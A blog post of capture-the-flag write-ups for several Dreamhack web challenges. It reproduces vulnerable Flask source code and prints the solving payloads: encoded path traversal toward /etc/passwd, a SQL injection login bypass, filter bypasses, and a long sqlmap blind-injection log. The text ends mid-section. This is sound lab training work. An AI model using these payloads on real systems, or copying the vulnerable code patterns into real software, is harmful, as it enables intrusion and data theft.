---
title: Dreamhack (2)
published: 2025-01-02
category: Writeups
tags: [web, dh, dreamhack, ctf]
image: "./image/titles/dreamhack.png"
description: Some cool and fun web challenges from dreamhack.
draft: false
---

# Web Hacking

## file-download-1

[Challenge](https://dreamhack.io/wargame/challenges/37)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/6610b977-48d4-4801-bc55-31015251ee6e.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241228%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241228T105013Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=0c01e29075a3063dff08a256ea8f40abc75777534485e257aa08719d6e30ae69)

This challenge involves `file upload` and `path traversal`. To exploit it, we need to create a file and attempt to leverage these vulnerabilities.

```python
#!/usr/bin/env python3
import os
import shutil

from flask import Flask, request, render_template, redirect

from flag import FLAG

APP = Flask(__name__)

UPLOAD_DIR = 'uploads'


@APP.route('/')
def index():
    files = os.listdir(UPLOAD_DIR)
    return render_template('index.html', files=files)


@APP.route('/upload', methods=['GET', 'POST'])
def upload_memo():
    if request.method == 'POST':
        filename = request.form.get('filename')
        content = request.form.get('content').encode('utf-8')

        if filename.find('..') != -1:
            return render_template('upload_result.html', data='bad characters,,')

        with open(f'{UPLOAD_DIR}/{filename}', 'wb') as f:
            f.write(content)

        return redirect('/')

    return render_template('upload.html')


@APP.route('/read')
def read_memo():
    error = False
    data = b''

    filename = request.args.get('name', '')

    try:
        with open(f'{UPLOAD_DIR}/{filename}', 'rb') as f:
            data = f.read()
    except (IsADirectoryError, FileNotFoundError):
        error = True


    return render_template('read.html',
                           filename=filename,
                           content=data.decode('utf-8'),
                           error=error)


if __name__ == '__main__':
    if os.path.exists(UPLOAD_DIR):
        shutil.rmtree(UPLOAD_DIR)

    os.mkdir(UPLOAD_DIR)

    APP.run(host='0.0.0.0', port=8000)
```

In the code, the input field for the filename is not thoroughly validated, only checking for `..` There are still various ways to exploit this, and I have tried using: 

```shell
filename = %2e%2e%2f%2e%2e%2fetc%2fpasswd
```

![pic1](./image/dreamhack/9.png)

We can see that the input is executed, and the name field in the URL is also not validated, allowing the use of `..` Therefore, after some attempts, I managed to retrieve the `flag` using `../flag.py`

![pic2](./image/dreamhack/10.png)

---

## pathtraversal

[Challenge](https://dreamhack.io/wargame/challenges/12)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/0dc1f20b-be42-4243-942b-7ddb8c2f4625.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241228%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241228T030504Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=546f4faeedeece7111ab1296f77447cfc0de4640a5b8918fcece2f8e8d3366d9)

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, abort
from functools import wraps
import requests
import os, json

users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}

def internal_api(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
        if request.remote_addr == '127.0.0.1':
            return func(*args, **kwargs)
        else:
            abort(401)
    return decorated_view

app = Flask(__name__)
app.secret_key = os.urandom(32)
API_HOST = 'http://127.0.0.1:8000'

try:
    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
except:
    FLAG = '[**FLAG**]'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)

@app.route('/api')
@internal_api
def api():
    return '/user/<uid>, /flag'

@app.route('/api/user/<uid>')
@internal_api
def get_flag(uid):
    try:
        info = users[uid]
    except:
        info = {}
    return json.dumps(info)

@app.route('/api/flag')
@internal_api
def flag():
    return FLAG

application = app # app.run(host='0.0.0.0', port=8000)
# Dockerfile
#     ENTRYPOINT ["uwsgi", "--socket", "0.0.0.0:8000", "--protocol=http", "--threads", "4", "--wsgi-file", "app.py"]
```

In this challenge, we need to exploit path traversal. According to the source code, the `get_info` function receives input via `userid`. The API then calls `{API_HOST}/api/user/{userid}`. Using this, I set `userid=../flag`, which results in the command `{API_HOST}/api/user/../flag`, equivalent to `{API_HOST}/api/flag`, successfully retrieving the `FLAG` variable

![pic1](./image/dreamhack/11.png)

---

## cookie

[Challenge](https://dreamhack.io/wargame/challenges/6)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/4c945539-da47-4641-989f-456796ef7c47.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241228%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241228T020355Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=588ed0900b95253dc618ebcf26d9c94e1c980f1b8ee6965e58098bd981995b22)

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

users = {
    'guest': 'guest',
    'admin': FLAG
}

@app.route('/')
def index():
    username = request.cookies.get('username', None)
    if username:
        return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            resp.set_cookie('username', username)
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>'

app.run(host='0.0.0.0', port=8000)
```

In this challenge, we only need to modify the value of the username in the cookie to retrieve the `flag`.

![pic1](./image/dreamhack/12.png)

---

## Find The Lost Flag

[Challenge](https://dreamhack.io/wargame/challenges/1649)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/ced3041d-0c81-4f70-af99-2e4f19fa7086.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241228%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241228T053447Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=b6ced5d2872634e82dd9da69ad79d227be559f9fced64b8711472306be58879b)

```python
from flask import Flask, request, render_template_string
import sqlite3

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('challenge.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, secret TEXT)''')
    c.execute("INSERT OR IGNORE INTO users (id, username, password, secret) VALUES (1, 'admin', '**[NO!]**', '**[HERE_IS_THE_FLAG]**')")
    c.execute("INSERT OR IGNORE INTO users (id, username, password, secret) VALUES (2, 'guest', 'guestpassword', 'Huh? Do you think the owner will give guests the flag? :)')")
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return '<h1>Welcome to the Secret Database</h1><p>Login to see your secrets.</p>'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        conn = sqlite3.connect('challenge.db')
        c = conn.cursor()
        query = f"SELECT secret FROM users WHERE username = '{username}' AND password = '{password}'"
        print(f"Executing query: {query}")

        try:
            c.execute(query)
            result = c.fetchone()
            if result:
                return f"<h1>Welcome, {username}!</h1><p>Your secret: {result[0]}</p>"
            else:
                return "<h1>Login failed</h1><p>Invalid username or password.</p>"
        except Exception as e:
            return f"<h1>Error</h1><p>{e}</p>"
        finally:
            conn.close()

    return '''
        <form method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''

if __name__ == '__main__':
    init_db()
    app.run(debug=True)
```

This is a simple challenge involving an `SQL injection vulnerability`. By logging in with the username `admin` and crafting commands for the remaining data, you can retrieve the `flag`.

```shell
payload:
username = admin' or 1=1 --
password = (anythings u want)
```

---

## Replace Trick!

[Challenge](https://dreamhack.io/wargame/challenges/1647)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/005d686d-1534-41ae-affe-2f84bd4f4ac8.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241228%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241228T000900Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=f54749d17a8b98f49c19dd754bae2e12a46d602f865ac424eb222602e260b9f2)

![pic1](./image/dreamhack/13.png)

In this challenge, we simply need to bypass the condition check by repeating the `flag` string, so when it is replaced, the `flag` remains unchanged for us.

```shell
/check?flag=flflagag
```

---

## baby-Case

[Challenge](https://dreamhack.io/wargame/challenges/1401)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/f05293a9-f89f-480c-8b8d-8793b3d06944.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241229%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241229T095925Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=ee0fbb59bd7b892766f4365cfe4241f27ecdb01e00f3a2d393862d4b8c264276)

In this challenge, the endpoints `/shop` and `/shop/...` are prohibited, so I sent a `POST` request to `/shoP` with the data set as `leg=flag`.

`script`
```javascript
fetch('shoP', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'leg=flag'
}).then(res=>res.text()).then(text=>console.log(text));
```

---

## simple-phparse

[Challenge](https://dreamhack.io/wargame/challenges/1367)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/465d7769-db68-4ebb-9e94-7d260e8c34a4.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241231%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241231T004835Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=5ff5cfdcf50f9d845c1ef515f919a4d218075df845372a0dc2eb8ccf082ababd)

In this challenge, we just need to bypass `flag.php` by URL-encoding it and converting the characters into hex to trick the server.

```shell
flag.php = %66%6c%61%67%2e%70%68%70
```

---

## access-log

[Challenge](https://dreamhack.io/wargame/challenges/1227)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/72c81a85-7938-4771-8d65-4907a17e6d12.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241231%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241231T002147Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=588d29a9b63e93e4df9cf4846080ef1d891a6d4298f54f5dd48ea60d84a7bc32)

In this challenge, our task is to analyze the hacker's attack using the `Time-Based Blind SQL Injection` payload. Based on that, I followed the payloads and found a field containing the `flag`. Then, I proceeded to filter it out and obtained the result:

```shell
172.20.0.1 - - [26/Apr/2024:17:50:51 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%3E790966%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1797 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:50:51 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%3E869334%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1798 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:50:51 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%3E592838%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1797 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:50:51 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%3E277472%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1796 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:50:51 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%3E391041%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1796 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:50:51 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%3E355987%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1798 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:50:52 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%3E317870%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1797 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:50:52 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%3E687850%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1797 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:50:52 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%3E324569%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1798 "-" "sqlmap
........
```

Here, I noticed an anomaly in the payload, specifically in cases where the attack targeted results different from expected values. From there, I filtered out the comparison fields and performed conversions, which led me to obtain the `flag`

```shell
172.20.0.1 - - [26/Apr/2024:17:50:53 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%208487%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%29%2C1%2C1%29%29%21%3D49%29%2CSLEEP%281%29%2C8487%29--%20Adyu&Submit=Submit HTTP/1.1" 200 1795 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:50:57 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C1%2C1%29%29%21%3D68%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:01 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C2%2C1%29%29%21%3D72%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1805 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:06 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C3%2C1%29%29%21%3D123%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:08 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C4%2C1%29%29%21%3D97%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:12 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C5%2C1%29%29%21%3D110%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1805 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:16 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C6%2C1%29%29%21%3D65%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1805 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:18 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C7%2C1%29%29%21%3D49%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:24 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C8%2C1%29%29%21%3D121%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1804 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:28 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C9%2C1%29%29%21%3D122%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:29 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C10%2C1%29%29%21%3D49%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:34 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C11%2C1%29%29%21%3D110%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:39 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C12%2C1%29%29%21%3D71%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1804 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:43 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C13%2C1%29%29%21%3D86%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:46 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C14%2C1%29%29%21%3D101%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:49 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C15%2C1%29%29%21%3D51%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1804 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:51:55 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C16%2C1%29%29%21%3D121%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:52:00 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C17%2C1%29%29%21%3D66%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1807 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:52:02 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C18%2C1%29%29%21%3D49%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1807 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:52:07 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C19%2C1%29%29%21%3D57%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1807 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:52:13 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C20%2C1%29%29%21%3D76%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1805 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:52:18 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C21%2C1%29%29%21%3D48%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1807 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:52:22 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C22%2C1%29%29%21%3D103%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1807 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:52:26 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C23%2C1%29%29%21%3D125%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
172.20.0.1 - - [26/Apr/2024:17:52:29 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%207724%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28id%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C1%2C1%29%29%21%3D49%29%2CSLEEP%281%29%2C7724%29--%20nhXl&Submit=Submit HTTP/1.1" 200 1802 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
```

`values`
```shell
49 68 72 123 97 110 65 49 121 122 49 110 71 86 101 51 121 66 49 57 76 48 103 125
```

---

## what-is-my-ip

[Challenge](https://dreamhack.io/wargame/challenges/1186)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/ebb53181-924e-4cc2-991a-db5100836305.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241231%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241231T045054Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=405061928cb1c96aafac364969b98bea1c767cade953e534d40dd4e77d92324a)

```python
#!/usr/bin/python3
import os
from subprocess import run, TimeoutExpired
from flask import Flask, request, render_template

app = Flask(__name__)
app.secret_key = os.urandom(64)


